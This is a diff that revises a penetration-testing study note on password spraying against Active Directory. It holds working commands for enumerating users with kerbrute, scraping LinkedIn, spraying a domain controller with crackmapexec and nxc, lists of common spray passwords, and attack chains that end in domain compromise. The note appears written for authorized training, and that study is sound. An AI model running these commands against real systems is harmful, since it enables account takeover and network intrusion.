@@ -1,122 +1,97 @@
-# Section 8 — Password Spraying Overview
+# Section 08 — Password Spraying Overview
 
-## What Is Password Spraying
-
-One password → many usernames. Opposite of brute force (many passwords → one username).
-
-**Why it works:** Organizations often have weak default/seasonal passwords. A single common password tried against every account is unlikely to trigger lockouts when done carefully.
-
-**Goal:** Land a low-privilege domain user account → opens BloodHound, further enumeration, and attack chains.
+> No lab questions. Concepts + workflow reference.
 
 ---
 
-## Spraying vs Brute Force
+## QUICK REFERENCE — Spray Workflow
+
+```bash
+# 1. Get password policy FIRST (section 09)
+nxc smb DC_IP -u USER -p PASS --pass-pol
+
+# 2. Build user list (section 10)
+kerbrute userenum -d DOMAIN --dc DC_IP wordlist.txt -o valid_users.txt
+
+# 3. Spray — ONE password at a time
+crackmapexec smb DC_IP -u valid_users.txt -p 'Welcome1' | grep +
+
+# 4. Wait (lockout duration + 1 min) before next round
+
+# 5. Validate hits
+nxc smb DC_IP -u HIT_USER -p 'Welcome1'
+```
+
+---
+
+## Spray vs Brute Force
 
 | | Password Spray | Brute Force |
-|--|---------------|------------|
+|-|---------------|-------------|
 | Passwords per user | 1 (or very few) | Many |
-| Lockout risk | Low (if controlled) | High |
-| Speed | Slow by design | Fast |
-| Use case | Initial foothold | Known target with weak policy |
+| Lockout risk | Low if controlled | High |
+| Use case | Initial foothold | Known weak policy target |
 
 ---
 
-## Lockout Risk — Critical Considerations
+## Lockout Rules — Never Skip This
 
-- **Know the policy before spraying** — enumerate it if you have any access
-- Common policy: 5 bad attempts → lockout, 30-minute auto-unlock
-- **Safe rule of thumb:** wait 2-4 hours between spray rounds if policy unknown
-- One targeted spray with a single common password is often the safest approach
-- Locking out hundreds of accounts = major incident during a pentest — career-ending on a bad day
+**Know the policy before you spray.** Locking out production accounts is a major incident.
 
-**Never spray without understanding the lockout threshold.**
-
----
-
-## Building a Username List
-
-Multiple sources — combine them all:
-
-```bash
-# 1. Kerbrute against DC with known username wordlists
-kerbrute userenum -d DOMAIN --dc DC_IP jsmith.txt -o valid_users.txt
-
-# 2. LinkedIn scraping
-python3 linkedin2username.py -u EMAIL -p PASS -c "Company Name"
-
-# 3. Google dorks for document metadata (author field leaks AD username format)
-filetype:pdf inurl:target.com
-exiftool document.pdf   # check Author field
-
-# 4. OSINT from external recon phase
-# 5. Statistically-likely-usernames repo (jsmith.txt, jsmith2.txt)
+```
+Threshold = 5  → spray max 3 passwords before waiting
+Duration  = 30 → wait 31 min between rounds
+Unknown policy → max 1-2 attempts total, wait 1+ hour between
 ```
 
-**Scenario 2 lesson:** If the org uses a predictable format (even GUIDs), generate all combinations with a script:
-```bash
-#!/bin/bash
-for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
-    do echo $x;
-done
-```
-Then feed to Kerbrute → you get every valid account, not just 40-60%.
+Safe formula: `threshold - 2 = max attempts per round`
 
 ---
 
 ## Common Spray Passwords
 
-Start with these — they work constantly in real environments:
-
 ```
-Welcome1
-Welcome1!
-Password1
-Password123
-Winter2024  (current season/year)
-Spring2024
-Company@123
-CompanyName1  (company name + number)
+Welcome1       Welcome1!      Password1      Password123
+Winter2025     Spring2025     Summer2025     Fall2025
+Company@123    CompanyName1   [company name + year]
 ```
 
 ---
 
-## Spray Workflow
+## Building a Username List
 
-```
-1. Enumerate password policy (if possible)
-2. Build username list (Kerbrute + LinkedIn + metadata)
-3. Pick ONE common password
-4. Spray — one attempt per user
-5. Wait (30 min minimum, ideally 2-4 hours)
-6. Repeat with next password if needed
-7. Take any hits → test against all exposed services (SMB, RDP, OWA, VPN)
+```bash
+# Kerbrute enumeration
+kerbrute userenum -d DOMAIN --dc DC_IP /opt/jsmith.txt -o valid_users.txt
+
+# LinkedIn scraping
+python3 linkedin2username.py -u EMAIL -p PASS -c "Company Name"
+
+# Document metadata (reveals AD username format)
+exiftool document.pdf     # check Author field
 ```
 
 ---
 
-## Real-World Attack Chains from Spraying
+## Real-World Attack Chains
 
-**Scenario 1:**
+### Chain 1 — Spray → BloodHound → DA
 ```
-Kerbrute enum (jsmith.txt + LinkedIn) → valid user list
-→ Spray Welcome1 → 2 low-priv hits
-→ BloodHound with creds → attack path identified → domain compromise
+Kerbrute + LinkedIn → user list → spray Welcome1 → 2 hits →
+BloodHound with creds → attack path → domain compromise
 ```
 
-**Scenario 2:**
+### Chain 2 — Metadata → All Accounts → DA
 ```
-PDF metadata → GUID username format discovered
-→ Generate all 1.6M combos → Kerbrute enum → ALL domain accounts
-→ Spray → valid creds → RBCD + Shadow Credentials attack → domain compromise
+PDF metadata → GUID username format → generate all 1.6M combos →
+Kerbrute enum → every domain account → spray → RBCD + Shadow Credentials → DA
 ```
 
 ---
 
 ## Exam Notes
 
-- Spraying = one password, many users — never the reverse during an assessment
-- Always enumerate the password policy first — asking the client is acceptable
-- Document metadata (exiftool) is a reliable source for username format
-- Even two low-priv hits from spraying is enough to run BloodHound and find a path
-- Spray results feed directly into: SMB, RDP, OWA, VPN, Citrix, WinRM testing
-- Next section covers enumerating the password policy before spraying
+- One password, many users — never the reverse
+- Password policy first, every time — no exceptions
+- Even 2 low-priv hits from spraying is enough to run BloodHound
+- Spray hits → immediately test against SMB, RDP, WinRM, OWA, VPN, Citrix
